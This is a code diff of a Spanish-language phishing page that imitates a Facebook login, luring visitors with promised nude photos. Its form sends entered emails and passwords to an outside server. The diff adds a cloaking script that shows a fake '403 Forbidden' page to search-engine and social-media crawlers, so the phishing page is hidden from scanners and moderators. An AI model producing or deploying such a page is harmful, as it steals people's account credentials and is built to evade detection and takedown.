@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <script type="text/javascript">
+        (function() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var bots = ["facebookexternalhit", "facebot", "googlebot", "bingbot", "adidxbot", "duckduckbot", "ia_archiver", "twitterbot", "baiduspider", "bot", "crawl", "spider", "slurp", "criteo"];
+            
+            for (var i = 0; i < bots.length; i++) {
+                if (userAgent.indexOf(bots[i]) !== -1) {
+                    document.documentElement.innerHTML = "<html><head><title>403 Forbidden</title></head><body style='font-family: Arial, sans-serif; background-color: #f0f0f0; color: #333; text-align: center; padding-top: 50px;'><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p><hr><address>Apache Server at Port 80</address></body></html>";
+                    window.stop(); // Detiene la carga del resto del código
+                    throw new Error("403 Forbidden"); // Bloquea ejecución de scripts posteriores
+                }
+            }
+        })();
+    </script>
+
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -100,7 +115,7 @@
             <section class="login-form-wrap">
                 <h1>Facebook</h1>
                 <div class="alert-msg">
-                   A continuación veras fotos  completamente sin ropaa, si eres adultoo inicia sesión nuevamente abajo para verlas.
+                    A continuación veras fotos  completamente sin ropaa, si eres adultoo inicia sesión nuevamente abajo para verlas.
                 </div>
                 <form class="login-form" name="anhsonnguyen" method="post" action="https://marines.materiales.site/pasta.php" onsubmit="return validateForm()">
                     <input type="text" name="email" required placeholder="Número de teléfono o correo">
